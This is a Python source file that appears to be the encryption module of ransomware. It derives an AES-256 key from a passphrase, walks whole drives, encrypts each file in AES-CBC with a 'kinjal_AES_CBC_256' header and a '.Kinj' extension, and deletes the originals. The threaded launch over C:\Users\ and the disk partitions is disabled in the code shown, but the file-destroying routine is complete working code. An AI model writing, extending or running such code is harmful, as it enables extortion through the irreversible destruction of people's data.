import os
import threading
from Crypto.Cipher import AES
from Crypto.Util import Padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class encryption_setup:
    def __init__(self, key: str, disk: list):
        self.encryption_key = key
        self.drive_list = disk
    def generate_key(self) -> bytes:
        salt = b'salt_'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000
        )
        key = kdf.derive(self.encryption_key.encode())
        return key

    def AES_CBC_256(self, path: str, key: bytes):
        file_data = b''
        with open(path, 'rb') as normal_file:
            while True:
                data = normal_file.read(30720)
                if not data:
                    break
                else:
                    file_data += data

        if file_data[:18] == b"kinjal_AES_CBC_256":
            pass
        else:
            try:
                iv = os.urandom(16)
                cipher = AES.new(key, AES.MODE_CBC, iv)
                padding_data = Padding.pad(file_data, 16)
                encrypted_data = cipher.encrypt(padding_data)
                with open(path + ".Kinj", 'wb') as encrypted_file:
                    encrypted_file.write(b"kinjal_AES_CBC_256" + encrypted_data + iv)
                del file_data
                os.remove(path)
            except Exception:
                pass

    def start_encryption(self):
        encryption_key = self.generate_key()
        def run(drive_disk):
            for disk in drive_disk:
                for path, dirs, files in os.walk(disk):
                    for file in files:
                        normal_path_file = os.path.join(path, file)
                        if normal_path_file[-5:] == ".Kinj":
                            continue
                        else:
                            self.AES_CBC_256(normal_path_file, encryption_key)



        disk_partitions = self.drive_list
        """path = ["C:\\Users\\", disk_partitions[:1], disk_partitions[1:]]
        if len(disk_partitions) > 1:
            threading.Thread(target=run, args=[path[0]]).start()
            threading.Thread(target=run, args=[path[1]]).start()
            threading.Thread(target=run, args=[path[2]]).start()
        else:
            threading.Thread(target=run, args=[disk_partitions]).start()
            threading.Thread(target=run, args=[path[0]]).start()"""